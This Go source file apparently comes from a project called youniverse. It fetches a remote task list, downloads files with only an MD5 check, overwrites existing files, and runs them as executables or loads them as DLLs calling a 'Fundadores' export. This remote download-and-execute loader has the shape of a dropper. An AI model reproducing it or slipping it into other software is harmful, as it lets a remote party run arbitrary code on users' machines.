package fundadore

import (
	"crypto/md5"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/ssoor/youniverse/api"
	"github.com/ssoor/youniverse/assistant"
	"github.com/ssoor/youniverse/common"
	"github.com/ssoor/youniverse/log"
	"github.com/ssoor/youniverse/youniverse"
)

func getMD5(data []byte) string {
	md5Ctx := md5.New()
	md5Ctx.Write(data)
	cipherStr := md5Ctx.Sum(nil)

	return hex.EncodeToString(cipherStr)
}

func downloadResource(resourceKey string, checkHash string, savePath string) ([]byte, error) {
	var data []byte

	if err := youniverse.Get(nil, resourceKey, &data); nil != err {
		return nil, err
	}

	dataHash := getMD5(data)
	if false == strings.EqualFold(checkHash, dataHash) {
		return nil, errors.New(fmt.Sprint("check ", resourceKey, " hash [", checkHash, "] failed, Unexpected hash [", dataHash, "]"))
	}

	if err := SetFile(data, savePath); err != nil {
		return nil, err
	}

	return data, nil
}

func SetFile(data []byte, fileName string) error {
	syscall.DeleteFile(syscall.StringToUTF16Ptr(fileName))
	syscall.MoveFile(syscall.StringToUTF16Ptr(fileName), syscall.StringToUTF16Ptr(fmt.Sprintf("%s-%x.del", fileName, time.Now().UnixNano())))

	filedir, err := filepath.Abs(filepath.Dir(fileName))
	if err != nil {
		return err
	}

	os.MkdirAll(filedir, 0777)
	file, err := os.Create(fileName)
	if nil != err {
		return err
	}
	defer file.Close()

	if _, err = file.Write(data); nil != err {
		return err
	}

	return nil
}

func implementationResource(resourceBody []byte, resourcePath string, execParameter string) error {
	execInfo := resourceExecInfo{}
	if err := json.Unmarshal([]byte(execParameter), &execInfo); err != nil {
		return err
	}

	if !strings.EqualFold(execInfo.PEType, "x86") {
		return errors.New("Unsupported PE type")
	}

	time.Sleep(time.Duration(execInfo.Delay) * time.Second)

	switch execInfo.FileType {
	case "res":
		return nil
	case "exe":
		exec_cmd := exec.Command(resourcePath, execInfo.Parameter)
		if err := exec_cmd.Start(); nil != err {
			return err
		}
	case "dll":
		library, err := syscall.LoadLibrary(resourcePath)
		if nil != err {
			return err
		}

		procFundadores, err := syscall.GetProcAddress(library, execInfo.PEEntry)
		if nil != err {
			return err
		}

		if 0 == procFundadores {
			return errors.New("function Fundadores not finded")
		}

		if ret, _, _ := syscall.Syscall(procFundadores, 1, uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(execInfo.Parameter))), 0, 0); 0 == ret {
			return errors.New("Call dll function Fundadores failed")
		}
	case "memdll":
		library, err := syscall.LoadLibrary(resourcePath)
		if nil != err {
			return err
		}

		procFundadores, err := syscall.GetProcAddress(library, execInfo.PEEntry)
		if nil != err {
			return err
		}

		if 0 == procFundadores {
			return errors.New("function Fundadores not finded")
		}

		if ret, _, _ := syscall.Syscall(procFundadores, 1, uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(execInfo.Parameter))), 0, 0); 0 == ret {
			return errors.New("Call dll function Fundadores failed")
		}
	}

	return nil
}

func getTasks(guid string, url string) ([]Task, error) {

	jsonTasks, err := api.GetURL(url)
	if err != nil {
		return []Task{}, err
	}

	tasks := []Task{}
	tasksOld := []TaskOld{}

	if err = json.Unmarshal([]byte(jsonTasks), &tasksOld); err == nil {
		var execInfoStr []byte
		for _, info := range tasksOld {

			newTask := Task{
				Name:     info.Name,
				Hash:     info.Hash,
				SavePath: info.Save.Path,
			}

			switch info.Save.Type {
			case "runexe":
				info.Save.Type = "exe"
			case "loaddll":
				info.Save.Type = "dll"
			}

			execInfo := resourceExecInfo{
				WorkPath:        "",
				FileType:        info.Save.Type,
				Parameter:       info.Save.Param,
				ContinueOnError: !info.Save.Must, // 取反

				Delay:      0,
				ShowMode:   0,
				PEType:     "x86",
				PEEntry:    "Fundadores",
				ModeServer: false,
			}

			if execInfoStr, err = json.Marshal(execInfo); err != nil {
				return []Task{}, err
			}

			newTask.Exec = string(execInfoStr)

			tasks = append(tasks, newTask)
		}

		return tasks, nil
	}

	if err = json.Unmarshal([]byte(jsonTasks), &tasks); err != nil {
		return []Task{}, err
	}

	return tasks, nil
}

func StartFundadores(account string, guid string, setting Settings) (downSucc bool, err error) {
	downSucc = true
	curDir, _ := common.GetCurrentDirectory()
	log.Info("Fundadores download starting, current arch is", runtime.GOARCH, ", dir is", curDir)

	allTasks, err := getTasks(account, setting.TasksURL)
	if nil != err {
		downSucc = false
		return downSucc, err
	}

	var resBody []byte
	for _, task := range allTasks {
		if re, err := regexp.Compile("%([\\S\\s]+?)%"); nil == err {
			task.SavePath = re.ReplaceAllStringFunc(task.SavePath, func(src string) string {
				if expand := os.ExpandEnv("${" + src[1:len(src)-1] + "}"); 0 != len(expand) {
					return expand
				}
				return src
			})
		}
		task.SavePath = os.ExpandEnv(task.SavePath)

		if resBody, err = downloadResource(task.Name, task.Hash, task.SavePath); nil != err { // 由于先判断的错误，这里 contiune 后下面代码就不会注册执行回调
			downSucc = false
			return downSucc, err
		}

		defer func(param1 Task) { // 执行函数
			if true == downSucc { // 如果下载没有失败的话, 启动
				go func(execTask Task) {
					assistantErr := error(nil)
					if assistantErr = assistant.ImplementationResource(resBody, execTask.SavePath, string(execTask.Exec)); nil != assistantErr { // 如果外部的执行失败的话，调用自身的执行方法
						err = implementationResource(resBody, execTask.SavePath, string(execTask.Exec))
					}

					log.Info("Fundadores implementation", assistantErr, "resource", execTask.Name, ", stats is:", err, "\n\texec parameters is", execTask.Exec)
				}(param1)
			}
		}(task)

		log.Info("Fundadores download resource", task.SavePath, task.Name, fmt.Sprintf("(%s)", task.Hash), ", stats is:", nil == err)

		if nil != err {
			log.Warning("\tDownload error:", err)
		}

	}

	log.Info("Youniverse stats info:")

	log.Info("\tGET : ", youniverse.Resource.Stats.Gets.String())
	log.Info("\tLOAD : ", youniverse.Resource.Stats.Loads.String(), "\tHIT  : ", youniverse.Resource.Stats.CacheHits.String())
	log.Info("\tPEER : ", youniverse.Resource.Stats.PeerLoads.String(), "\tERROR: ", youniverse.Resource.Stats.PeerErrors.String())
	log.Info("\tLOCAL: ", youniverse.Resource.Stats.LocalLoads.String(), "\tERROR: ", youniverse.Resource.Stats.LocalLoadErrs.String())

	downSucc = true
	return downSucc, err
}
